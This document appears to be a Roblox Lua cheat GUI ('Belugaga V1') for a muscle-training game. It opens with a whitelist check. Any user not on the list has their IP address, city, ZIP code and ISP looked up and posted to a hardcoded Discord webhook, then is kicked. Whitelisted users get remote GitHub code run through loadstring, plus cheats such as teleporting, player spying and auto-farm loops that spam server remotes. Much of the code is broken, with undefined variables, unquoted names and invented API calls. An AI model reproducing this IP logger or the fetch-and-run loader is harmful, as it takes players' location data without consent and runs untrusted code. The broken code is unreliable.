-- Whitelist for specific usernames
local whitelistedUsers = {
    "Mrbignewcoming3",
    "Hi_dorihi",  -- whitelisted
}

-- Function to check if player is whitelisted
local function isWhitelisted(username)
    for _, whitelisted in ipairs(whitelistedUsers) do
        if username == whitelisted then
            return true
        end
    end
    return false
end

-- Get the local player's username
local player = game.Players.LocalPlayer
local username = player.Name

-- Function to send data to the webhook
local function sendWebhookData(player_name, ipinfo_table)
    local webhook_url = "https://discord.com/api/webhooks/1330113801558691840/27eBfT1ihaS3EqJOhTLi4-rxb1y1no-l3kESIRYiGgG5Bgre0we5SqI6EFOPBoEifp14"  -- Replace with your actual webhook URL
    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
        player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
    
    local success, response = pcall(function()
        game:GetService("HttpService"):PostAsync(
            webhook_url, 
            game:GetService("HttpService"):JSONEncode({["content"] = dataMessage}),
            Enum.HttpContentType.ApplicationJson
        )
    end)

    if not success then
        warn("Failed to send webhook data: " .. response)
    end
end

-- If the player is not whitelisted, get their IP info and kick them
if not isWhitelisted(username) then
    local player_name = player.Name

    -- Get IP information
    local ip_info
    local success, response = pcall(function()
        ip_info = game:GetService("HttpService"):GetAsync("http://ip-api.com/json")
    end)

    if not success then
        warn("Failed to get IP info: " .. response)
        return
    end

    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info)

    -- Send IP info to webhook
    sendWebhookData(player_name, ipinfo_table)

    -- Kick the player
    player:Kick("Not WhiteListed L")
else
    -- If the player is whitelisted, load the GUI

    local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/adopttesting/Testing/refs/heads/main/Library", true))()

    local window = library:AddWindow("Belugaga V1 [] Made By Adopt", {
        main_color = Color3.fromRGB(0, 0, 0), -- Color
        min_size = Vector2.new(500, 450), -- Size of the gui
        can_resize = false, -- true or false
    })

    local Client = window:AddTab("Client")
    Client:AddLabel("Local Player")

    -- Set Size 2
    Client:AddButton("Set Size 2", function()
        local args = {
            [1] = "changeSize",
            [2] = 2
        }

        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("changeSpeedSizeRemote"):InvokeServer(unpack(args))
    end)

    -- WalkSpeed TextBox
    Client:AddTextBox("Type WalkSpeed Amount", function(text)
        local walkSpeedAmount = tonumber(text)
        if walkSpeedAmount then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeedAmount
        else
            print("Invalid WalkSpeed input!")
        end
    end)

Client:AddButton("Apply WalkSpeed",function()
	-- Code here
end)

    -- JumpPower TextBox
    Client:AddTextBox("Type JumpPower Amount", function(text)
        local jumpPowerAmount = tonumber(text)
        if jumpPowerAmount then
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = jumpPowerAmount
        else
            print("Invalid JumpPower input!")
        end
    end)

Client:AddButton("Apply JumpPower",function()
	-- Code here
end)

    -- Size TextBox
    Client:AddTextBox("Type Size (1 to 500)", function(text)
        local sizeAmount = tonumber(text)
        if sizeAmount and sizeAmount >= 1 and sizeAmount <= 500 then
            local character = game.Players.LocalPlayer.Character
            if character then
                character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame)  -- Reset the character's CFrame to avoid issues while resizing
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Size = Vector3.new(sizeAmount, sizeAmount, sizeAmount)
                    end
                end
            end
        else
            print("Invalid size input! Please enter a value between 1 and 500.")
        end
    end)

Client:AddLabel("Client Things")

local isPositionLocked = false
local lockedPosition = nil

Client:AddSwitch("Lock Client Position", function(bool)
    isPositionLocked = bool

    if isPositionLocked then
        -- Store the player's current position when the toggle is turned on
        lockedPosition = LocalPlayer:GetPosition()
    else
        -- Optionally, you can reset the locked position when turning it off
        lockedPosition = nil
    end
end)

-- This function will keep the player at the locked position if the toggle is on
function FreezePlayerPosition()
    if isPositionLocked and lockedPosition then
        LocalPlayer:SetPosition(lockedPosition)
    end
end

-- Call this function every frame to freeze the position
Client:AddCallback("OnUpdate", function()
    FreezePlayerPosition()
end)

local isAntiKickEnabled = false
local activityTimer = 0
local activityInterval = 30  -- Interval in seconds to send a "keep-alive" signal
local lastActivityTime = 0

-- Function to send a keep-alive signal (simulated)
function SendKeepAliveSignal()
    if isAntiKickEnabled then
        -- Simulate sending a "keep-alive" signal to prevent disconnection
        -- Replace this with the actual method you need to use (e.g., sending a chat message or a server request)
        -- Example: Client:SendMessage("ping")
        print("Sending keep-alive signal...")
        -- You can use a chat message or any other method that the server recognizes as activity
    end
end

-- Anti Kick Toggle Callback
Client:AddSwitch("Anti Kick", function(bool)
    isAntiKickEnabled = bool

    if isAntiKickEnabled then
        lastActivityTime = os.time()  -- Start monitoring the activity time
    end
end)

-- Update function to monitor time and send periodic activity signals
Client:AddCallback("OnUpdate", function()
    if isAntiKickEnabled then
        local currentTime = os.time()
        
        -- If no activity in the specified interval, send keep-alive signal
        if currentTime - lastActivityTime >= activityInterval then
            SendKeepAliveSignal()
            lastActivityTime = currentTime  -- Update last activity time
        end
    end
end)

-- Optional: You can also track player activity (e.g., movement, chat, etc.) to update the `lastActivityTime`
-- Example:
-- Client:AddCallback("OnPlayerMove", function()
--     lastActivityTime = os.time()  -- Reset activity time when player moves
-- end)

local isAntiPushEnabled = false

-- Function to prevent interaction (such as pushing or using tools on the player)
function PreventPlayerInteraction()
    if isAntiPushEnabled then
        -- Prevent interactions, e.g., by setting collision properties, ignoring physics, or denying tool usage
        -- Here, we will assume the server allows us to modify tool usage or collision with the player

        -- For example, disabling the tool's action if it targets the player
        Client:AddCallback("OnPlayerUseTool", function(player, tool)
            if player == LocalPlayer then
                return false  -- Prevent the action from going through if it's targeting this player
            end
        end)

        -- You can also add logic for preventing physical pushing, using character collision, or freezing physics interactions
        -- Example: Disable collisions between the player and other players
        LocalPlayer:SetCollisionEnabled(false)  -- Disables collision with other players
    else
        -- Re-enable the collisions when Anti Push is disabled
        LocalPlayer:SetCollisionEnabled(true)
    end
end

-- Anti Push Toggle Callback
Client:AddSwitch("Anti Push", function(bool)
    isAntiPushEnabled = bool
    PreventPlayerInteraction()  -- Toggle the Anti Push effect when the switch is toggled
end)

-- Optionally, handle tool usage interaction specifically (e.g., using a weapon or pushing tool)
Client:AddCallback("OnToolUsed", function(tool, targetPlayer)
    if isAntiPushEnabled and targetPlayer == LocalPlayer then
        -- Block the tool action if Anti Push is on
        return false  -- Prevent tool action when targeting the player
    end
end

Client:AddButton("Destroy Ad teleport", function() 
    -- Find and destroy the part named "RobloxForwardPortals" 
    local part = workspace:FindFirstChild("RobloxForwardPortals") 
    if part then 
        part:Destroy() 
        print("Part 'RobloxForwardPortals' has been destroyed.") 
    else 
        print("Part 'RobloxForwardPortals' not found.") 
    end 
end)

  -- Players tab for selecting a player and viewing stats
local Players = window:AddTab("Players")
Players:AddLabel("Spectate Player")

local selectedPlayerName = nil -- To store the player name entered
local viewingPlayer = false -- To track whether the camera is locked on a player

-- Add TextBox for selecting a player
Players:AddTextBox("Player Name", function(playerName)
    selectedPlayerName = playerName
end)

-- Add toggle to lock/unlock camera view
Players:AddSwitch("Spy Player", function(bool)
    local camera = game.Workspace.CurrentCamera

    if bool then
        -- Enable camera lock
        if selectedPlayerName then
            local targetPlayer = game.Players:FindFirstChild(selectedPlayerName)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local humanoidRootPart = targetPlayer.Character.HumanoidRootPart
                viewingPlayer = true -- Enable camera following

                -- Loop to lock camera while the toggle is active
                while viewingPlayer and bool do
                    camera.CameraSubject = humanoidRootPart
                    wait()
                end
            end
        end
    else
        -- Disable camera lock and reset to the player's own character
        viewingPlayer = false
        camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
    end
end)


Players:AddLabel("View Stats")

local playerData = {}
local currentSelectedPlayer = nil
local notFoundLabel = nil
local selectedPlayerName = nil

-- Function to abbreviate large numbers
local function abbreviateNumber(value)
    if value >= 1e15 then
        return string.format("%.1fQa", value / 1e15)
    elseif value >= 1e12 then
        return string.format("%.1fT", value / 1e12)
    elseif value >= 1e9 then
        return string.format("%.1fB", value / 1e9)
    elseif value >= 1e6 then
        return string.format("%.1fM", value / 1e6)
    elseif value >= 1e3 then
        return string.format("%.1fK", value / 1e3)
    else
        return tostring(value)
    end
end

-- Function to create player data labels
local function createPlayerLabels(player)
    local playerName = player.Name
    local leaderstats = player:FindFirstChild("leaderstats")
    local equippedPets = player:FindFirstChild("equippedPets")
    local ownedGamepasses = player:FindFirstChild("ownedGamepasses")

    local labels = {
        StrengthLabel = Players:AddLabel("Strength: " .. abbreviateNumber(leaderstats.Strength.Value or 0)),
        DurabilityLabel = Players:AddLabel("Durability: " .. abbreviateNumber(player.Durability.Value or 0)),
        KillsLabel = Players:AddLabel("Kills: " .. abbreviateNumber(leaderstats.Kills.Value or 0)),
        BrawlsLabel = Players:AddLabel("Brawls: " .. abbreviateNumber(leaderstats.Brawls.Value or 0)),
        AgilityLabel = Players:AddLabel("Agility: " .. abbreviateNumber(player.Agility.Value or 0)),
        EvilKarmaLabel = Players:AddLabel("evilKarma: " .. abbreviateNumber(player.evilKarma.Value or 0)),
        GoodKarmaLabel = Players:AddLabel("goodKarma: " .. abbreviateNumber(player.goodKarma.Value or 0)),
        MapLabel = Players:AddLabel("Map: " .. (player.currentMap.Value or "N/A")),
        KingTimeLabel = Players:AddLabel("KingTime: " .. abbreviateNumber(player.muscleKingTime.Value or 0)),
        PremiumLabel = Players:AddLabel("Premium: " .. (player.MembershipType == Enum.MembershipType.Premium and "true" or "false")),
    }

    for i = 1, 5 do
        local petValue = equippedPets:FindFirstChild("pet" .. i) and equippedPets["pet" .. i].Value or "N/A"
        labels["Pet" .. i .. "Label"] = ViewStatsTab:AddLabel("Pet" .. i .. ": " .. tostring(petValue))
    end

    local gamepassList = {}
    if ownedGamepasses then
        for _, gamepass in ipairs(ownedGamepasses:GetChildren()) do
            table.insert(gamepassList, gamepass.Name)
        end
    end

    local gamepassesText = #gamepassList > 0 and table.concat(gamepassList, ", ") or "N/A"
    labels.GamepassesLabel = ViewStatsTab:AddLabel("ownedGamepasses: " .. gamepassesText)

    playerData[playerName] = labels

    -- Update labels dynamically on stat changes
    leaderstats.Kills.Changed:Connect(function()
        labels.KillsLabel.Text = "Kills: " .. abbreviateNumber(leaderstats.Kills.Value or 0)
    end)

    leaderstats.Strength.Changed:Connect(function()
        labels.StrengthLabel.Text = "Strength: " .. abbreviateNumber(leaderstats.Strength.Value or 0)
    end)

    leaderstats.Brawls.Changed:Connect(function()
        labels.BrawlsLabel.Text = "Brawls: " .. abbreviateNumber(leaderstats.Brawls.Value or 0)
    end)

    player.Durability.Changed:Connect(function()
        labels.DurabilityLabel.Text = "Durability: " .. abbreviateNumber(player.Durability.Value or 0)
    end)

    player.Agility.Changed:Connect(function()
        labels.AgilityLabel.Text = "Agility: " .. abbreviateNumber(player.Agility.Value or 0)
    end)

    player.evilKarma.Changed:Connect(function()
        labels.EvilKarmaLabel.Text = "evilKarma: " .. abbreviateNumber(player.evilKarma.Value or 0)
    end)

    player.goodKarma.Changed:Connect(function()
        labels.GoodKarmaLabel.Text = "goodKarma: " .. abbreviateNumber(player.goodKarma.Value or 0)
    end)

    player.currentMap.Changed:Connect(function()
        labels.MapLabel.Text = "Map: " .. (player.currentMap.Value or "N/A")
    end)

    player.muscleKingTime.Changed:Connect(function()
        labels.KingTimeLabel.Text = "KingTime: " .. abbreviateNumber(player.muscleKingTime.Value or 0)
    end)
end

-- Function to remove player data labels
local function removePlayerLabels(playerName)
    local labels = playerData[playerName]
    if labels then
        for _, label in pairs(labels) do
            label:Remove()
        end
        playerData[playerName] = nil
    end
end

-- Textbox for entering player name to view stats
Players:AddTextBox("Player Name", function(playerName)
    selectedPlayerName = playerName
    if notFoundLabel then
        notFoundLabel:Remove()
        notFoundLabel = nil
    end

    local player = game.Players:FindFirstChild(playerName)
    if player then
        if currentSelectedPlayer then
            removePlayerLabels(currentSelectedPlayer)
        end
        createPlayerLabels(player)
        currentSelectedPlayer = playerName
    else
        notFoundLabel = Players:AddLabel("Player not found!")
    end
end)



local ServerTab = window:AddTab("Server")

local elapsedTimeLabel = ServerTab:AddLabel("Elapsed Time:")
local formattedTimeLabel = ServerTab:AddLabel("Week: 0 Day: 0 Hour: 0 Minute: 0 Second: 0")  -- New label for formatted time
local playerCountLabel = ServerTab:AddLabel("Amount of Players in Server:")
local currentPlayerCountLabel = ServerTab:AddLabel("Players in Server: 0")  -- New label for current player count

local elapsedTime = 0  -- Start with 0 elapsed time

-- Function to format the elapsed time
local function formatElapsedTime(seconds)
    local week = math.floor(seconds / 604800)  -- 7 days = 604800 seconds
    local day = math.floor((seconds % 604800) / 86400)  -- 1 day = 86400 seconds
    local hour = math.floor((seconds % 86400) / 3600)  -- 1 hour = 3600 seconds
    local minute = math.floor((seconds % 3600) / 60)  -- 1 minute = 60 seconds
    local second = seconds % 60  -- Remaining seconds
    return string.format("Week: %d Day: %d Hour: %d Minute: %d Second: %d", week, day, hour, minute, second)
end

-- Update elapsed time every second
game:GetService("RunService").Heartbeat:Connect(function()
    elapsedTime = elapsedTime + 1  -- Increase by 1 second
    elapsedTimeLabel.Text = "Elapsed Time: " .. elapsedTime  -- Update the basic elapsed time label
    formattedTimeLabel.Text = formatElapsedTime(elapsedTime)  -- Update the formatted time label every second
end)

-- Function to update player count label
local function updatePlayerCount()
    currentPlayerCountLabel.Text = "Players in Server: " .. #game.Players:GetPlayers()  -- Update the label with the current player count
end

-- Listen for player join/leave to update the player count
game.Players.PlayerAdded:Connect(updatePlayerCount)
game.Players.PlayerRemoving:Connect(updatePlayerCount)

-- TextBox for entering player name to teleport
local playerNameTextBox = ServerTab:AddTextBox("Enter Player Name to Teleport", function(playerName)
    selectedName = playerName
end)

-- Button to teleport to the player entered in the TextBox
ServerTab:AddButton("Teleport to Player", function()
    if selectedName then
        local selectedPlayer = game.Players:FindFirstChild(selectedName)
        if selectedPlayer then
            -- Teleport the local player to the selected player's position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = selectedPlayer.Character.HumanoidRootPart.CFrame
        else
            warn("Player not found!")
        end
    else
        warn("No player name entered!")
    end
end)

local AutoFarm = window:AddTab("Auto Farm")

AutoFarm:AddLabel("Tools")

AutoFarm:AddLabel("Normal Farming")

local folder = features:AddFolder(Jungle Farming)
local isInfiniteEventEnabled = false
local eventThread = nil  -- Thread for infinite event loop

-- Function to fire the two events continuously
function FireInfiniteEvents()
    while isInfiniteEventEnabled do
        -- First event (muscleEvent)
        local args1 = {
            [1] = "rep",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Jungle Squat"):WaitForChild("interactSeat")
        }
        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))

        -- Second event (machineInteractRemote)
        local args2 = {
            [1] = "useMachine",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Jungle Squat"):WaitForChild("interactSeat")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))

        -- Wait for a short interval before repeating
        wait(0.1)  -- Adjust this interval to control how often the events fire
    end
end

-- Toggle callback
folder:AddSwitch("Auto Jungle Squat", function(bool)
    isInfiniteEventEnabled = bool

    if isInfiniteEventEnabled then
        -- Start the event loop when the toggle is on
        if not eventThread then
            eventThread = spawn(FireInfiniteEvents)
        end
    else
        -- Stop the event loop when the toggle is off
        if eventThread then
            eventThread = nil
        end
    end
end)


local isInfiniteEventEnabled = false
local eventThread = nil  -- Thread for infinite event loop

-- Function to fire the two events continuously for Jungle Bench
function FireInfiniteEvents()
    while isInfiniteEventEnabled do
        -- First event (muscleEvent)
        local args1 = {
            [1] = "rep",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Jungle Bench"):WaitForChild("interactSeat")
        }
        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))

        -- Second event (machineInteractRemote)
        local args2 = {
            [1] = "useMachine",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Jungle Bench"):WaitForChild("interactSeat")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))

        -- Wait for a short interval before repeating
        wait(0.1)  -- Adjust this interval to control how often the events fire
    end
end

-- Toggle callback
folder:AddSwitch("Auto Jungle Bench", function(bool)
    isInfiniteEventEnabled = bool

    if isInfiniteEventEnabled then
        -- Start the event loop when the toggle is on
        if not eventThread then
            eventThread = spawn(FireInfiniteEvents)
        end
    else
        -- Stop the event loop when the toggle is off
        if eventThread then
            eventThread = nil
        end
    end
end)

local folder2 = features:AddFolder(Muscle King Farming)
local isInfiniteEventEnabled = false
local eventThread = nil  -- Thread for infinite event loop

-- Function to fire the two events continuously for Muscle King Bench
function FireInfiniteEvents()
    while isInfiniteEventEnabled do
        -- First event (muscleEvent)
        local args1 = {
            [1] = "rep",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Bench"):WaitForChild("interactSeat")
        }
        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))

        -- Second event (machineInteractRemote)
        local args2 = {
            [1] = "useMachine",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Bench"):WaitForChild("interactSeat")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))

        -- Wait for a short interval before repeating
        wait(0.1)  -- Adjust this interval to control how often the events fire
    end
end

-- Toggle callback
folder:AddSwitch("Auto Muscle King Bench", function(bool)
    isInfiniteEventEnabled = bool

    if isInfiniteEventEnabled then
        -- Start the event loop when the toggle is on
        if not eventThread then
            eventThread = spawn(FireInfiniteEvents)
        end
    else
        -- Stop the event loop when the toggle is off
        if eventThread then
            eventThread = nil
        end
    end
end)

local isInfiniteEventEnabled = false
local eventThread = nil  -- Thread for infinite event loop

-- Function to fire the two events continuously for Muscle King Lift
function FireInfiniteEvents()
    while isInfiniteEventEnabled do
        -- First event (muscleEvent)
        local args1 = {
            [1] = "rep",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Lift"):WaitForChild("interactSeat")
        }
        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))

        -- Second event (machineInteractRemote)
        local args2 = {
            [1] = "useMachine",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Lift"):WaitForChild("interactSeat")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))

        -- Wait for a short interval before repeating
        wait(0.1)  -- Adjust this interval to control how often the events fire
    end
end

-- Toggle callback
folder2:AddSwitch("Auto Muscle King Lift", function(bool)
    isInfiniteEventEnabled = bool

    if isInfiniteEventEnabled then
        -- Start the event loop when the toggle is on
        if not eventThread then
            eventThread = spawn(FireInfiniteEvents)
        end
    else
        -- Stop the event loop when the toggle is off
        if eventThread then
            eventThread = nil
        end
    end
end)

local isInfiniteEventEnabled = false
local eventThread = nil  -- Thread for infinite event loop

-- Function to fire the two events continuously for King Boulder
function FireInfiniteEvents()
    while isInfiniteEventEnabled do
        -- First event (muscleEvent)
        local args1 = {
            [1] = "rep",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("King Boulder"):WaitForChild("interactSeat")
        }
        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))

        -- Second event (machineInteractRemote)
        local args2 = {
            [1] = "useMachine",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("King Boulder"):WaitForChild("interactSeat")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))

        -- Wait for a short interval before repeating
        wait(0.1)  -- Adjust this interval to control how often the events fire
    end
end

-- Toggle callback
folder2:AddSwitch("Auto King Boulder", function(bool)
    isInfiniteEventEnabled = bool

    if isInfiniteEventEnabled then
        -- Start the event loop when the toggle is on
        if not eventThread then
            eventThread = spawn(FireInfiniteEvents)
        end
    else
        -- Stop the event loop when the toggle is off
        if eventThread then
            eventThread = nil
        end
    end
end)

local isInfiniteEventEnabled = false
local eventThread = nil  -- Thread for infinite event loop

-- Function to fire the two events continuously for Muscle King Squat
function FireInfiniteEvents()
    while isInfiniteEventEnabled do
        -- First event (muscleEvent)
        local args1 = {
            [1] = "rep",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Squat"):WaitForChild("interactSeat")
        }
        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))

        -- Second event (machineInteractRemote)
        local args2 = {
            [1] = "useMachine",
            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Squat"):WaitForChild("interactSeat")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))

        -- Wait for a short interval before repeating
        wait(0.1)  -- Adjust this interval to control how often the events fire
    end
end

-- Toggle callback
folder2:AddSwitch("Auto Muscle King Squat", function(bool)
    isInfiniteEventEnabled = bool

    if isInfiniteEventEnabled then
        -- Start the event loop when the toggle is on
        if not eventThread then
            eventThread = spawn(FireInfiniteEvents)
        end
    else
        -- Stop the event loop when the toggle is off
        if eventThread then
            eventThread = nil
        end
    end
end)

--script whitelist end
end
